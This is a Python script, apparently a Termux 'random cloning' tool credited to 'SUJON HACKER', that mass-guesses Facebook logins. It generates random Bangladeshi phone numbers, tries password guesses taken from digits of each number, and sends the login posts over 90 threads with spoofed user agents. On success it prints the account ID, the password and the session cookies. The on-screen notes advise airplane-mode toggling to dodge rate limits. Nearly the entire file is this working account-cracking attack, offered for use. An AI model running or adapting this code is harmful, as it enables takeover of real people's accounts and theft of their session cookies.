import time,os,json,sys,re,string, random 
from concurrent.futures import ThreadPoolExecutor as ThreadPool


try:
    import rich
except:
    print("\n[!?] Installing Rich...\n")
    os.system("pip install rich")
    import rich

try:
    import requests
except:
    print("\n[!?] Installing Requests...\n")
    os.system("pip install requests")
    import requests

try:
    import httpx
except:
    print("\n[!?] Installing Httpx...\n")
    os.system("pip install httpx")
    import httpx

try:
    import bs4
except:
    print("\n[!?] Installing Bs4...\n")
    os.system("pip install bs4")
    import bs4



from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
pretty.install()

from datetime import datetime 
ct=str(datetime.now())
ct2=ct.split(" ")[0]
ct3=ct2.split("-")[1]
mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
month=mon[ct3]
datea=ct2.split("-")[2]


def lod(message):
    
    for i in track(range(300), description=f"[red][bold] {message}"):
        time.sleep(0.01)



def clear():
    shell("clear")

def logo():
    clear()
    print(f"""

 .oooooo..o                 o8o                       
d8P'    `Y8                 `"'                       
Y88bo.      oooo  oooo     oooo  .ooooo.  ooo. .oo.   
 `"Y8888o.  `888  `888     `888 d88' `88b `888P"Y88b  
     `"Y88b  888   888      888 888   888  888   888  
oo     .d8P  888   888      888 888   888  888   888  
8""88888P'   `V88V"V8P'     888 `Y8bod8P' o888o o888o 
                            888                       
                        .o. 88P                       
                        `Y888P 
                                                                   """)
    
def space():
    print("\n")


number=int("+8801600251351")

devoloper_info={
    "Developer" :  'SUJON HACKER',
    "Number" :  number,
    "Status" :  '24-ONLINE',
    "GitHub Url":  'https://github.com/MD-ARAFAT1001',
    "Facebook" :  'https://www.facebook.com/profile.php?id=100004732534107&mibextid=ZbWKwL',
    }

date={
    "Day":datea,
    "Month":month,
 }
mj=Tree("[bold purple]![[bold red]A[bold purple]] ")
mj.add("[cyan][bold]RANDOM CLONEING ").add("[bold green][GOOD]")

mx=Tree("[bold purple]![[bold red]B[bold purple]] ")
mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")

my=Tree("[bold purple]![[bold red]C[bold purple]] ")
my.add("[tan][bold]REPORT BUG ")

cv=Tree("[bold blue][>+<]")
cv.add("[bold red]Choice Option")



ugen=[]
for x in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7.0','8.1.0','9','10','11','12','13','14','15','16','17'])
    c=random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R',
  		  'GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X',
			'GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230',
			'GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838',
			'GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L',
			'GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1'
    h=random.randrange(20,150)
    i='0'
    j=random.randrange(3000,5000)
    k=random.randrange(40,150)
    l='Chrome/79.0.3945.136 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)


note1="""- __Inbox__ Me for Join `ARAFAT_CYBER_Z9NE`\n- Try tool and **Review**"""
n1=Markdown(note1)

note2="""#  __RANDOM CLONEING TASK BOX__\n- Choice BD code \n- And Put Limit"""
n2=Markdown(note2)

note3="""- __System__ Starting Bro Wait\n- Follow our **FB Group**\n- Inbox Me For Anything"""
n3=Markdown(note3)

note4="""- Use Airplane mode in every 3 minutes \n- Use APN For Get More Ok ID \n- Cracking Started """
n4=Markdown(note4)

nv = Padding("TOOL MENU", style="on green", expand=False)
cxx = Padding("DONE",(1,2), style="on green", expand=False)



import os
try:
    open(".itu.txt","r").read()
except:
    os.system("pkg install play-audio")
    open(".itu.txt","w").write("__&")
try:
    import gtts
except:
    os.system("pip install gtts")
    import gtts
from gtts import gTTS

def create_(text,file):
    my_a = gTTS(text)
    my_a.save(file)


def play_audio(audio_file):
    os.system("play-audio "+audio_file)

def dual(text,file):
    create_(text,file)
    play_audio(file)
    

ok=[]
ok.append("199")
loop=0
def main():
    logo()
    space()
    print(n3)
    space()
    lod("STARTING TOOL...")
    logo()
    print_json(data=devoloper_info)
    print(Panel(n1,title="[bold red]NOTE"))
    space()
    dual("Hello bro,I am ,ARAFAT,welcome to our tool","y.mp3")
    
    print(nv)
    space()
    print(mj)
    print(mx)
    print(my)
    space()
    print(cv)
    choice=input("    └──>")
    if choice in ["a","A","1","01"]:
        numb()
    else:
        numb()

def numb():
    user=[]
    logo()
    
    print(n2)
    space()
    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example 017, 019, 016, ")
    code=input("                        ✓ Choice ->")
    print("                      [bold yellow]  ✓ [bold green]You Choosed "+code)
    space()
    space()
    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 1000,2000,3000") 
    limit=int(input("                        ✓ Choice ->"))
    print("                      [yellow] [bold] ✓[bold green] Crack Limit ",limit)
    print(cxx)
    space()
    for i in track(range(limit),description="      Dumping"):
        numx=''.join(random.choice(string.digits) for _ in range(8))
        user.append(numx)
    dual("Dumping successful","y.mp3")
    
    with ThreadPool (max_workers=90) as feel:
        logo()
        print(Markdown("# CHOOSE MATHOD"))
        space()
        Mathi1=Tree("[bold white][A/1]")
        Mathi1.add("M. FACEBOOK ")
        print(Mathi1)
        space()
        Mathi2=Tree("[bold green][B/2]")
        Mathi2.add("MBASIC. FACEBOOK ")
        print(Mathi2)
        space()
        Mathi3=Tree("[bold blue][C/3]")
        Mathi3.add("P. FACEBOOK ")
        print(Mathi3)
        space()
        Mathi4=Tree("[bold yellow][D/4]")
        Mathi4.add("X. FACEBOOK ")
        print(Mathi4)
        space() 
        Mathi5=Tree("[bold red][E/5]")
        Mathi5.add("FREE. FACEBOOK ")
        print(Mathi5)
        space()
        Mathi6=Tree("[bold cyan][F/6]")
        Mathi6.add("TOUCH. FACEBOOK ")
        print(Mathi6)
        space()
        jbs=input("                [✓] choice:")
        if jbs in ["1","A","a","01"]:
            tsg="m"
        elif jbs in ["2","B","b","02"]:
            tsg="mbasic"
        elif jbs in ["3","C","c","03"]:
            tsg="p"
        elif jbs in ["4","D","d","04"]:
            tsg="x"
        elif jbs in ["5","E","e","05"]:
            tsg="free"
        elif jbs in ["6","F","f","06"]:
            tsg="touch"
        else:
            tsg="m"
        logo()
        tl=str(len(user))
        tl_=Tree("[green]Total ID ")
        tl_.add("[bold green]"+tl)
        mathod=Tree("[blue]Mathod")
        mathod.add("[bold blue]"+tsg)
        
        space()
        print(n4)
        space()
        print_json(data=date)
        space()
        print(tl_)
        space()
        print(mathod)
        print(Markdown("# Crack Started"))
        space()
        for i in user:
            uid=code+i
            fb=tsg
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)# 11
            feel.submit(need,uid,pwx,fb,tl)



def need(uid,pwx,fb,tl):
    global ok,ugen,loop
    session=requests.session()
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            uuu=random.choice(ugen)
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                hh=str(len(ok))
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15]
                print("\r\r\n\n")
                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                #print(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
                
                ok.append(uid)
                break
            
            else:
                continue
        loop+=1
    except:
        time.sleep(15)

main()
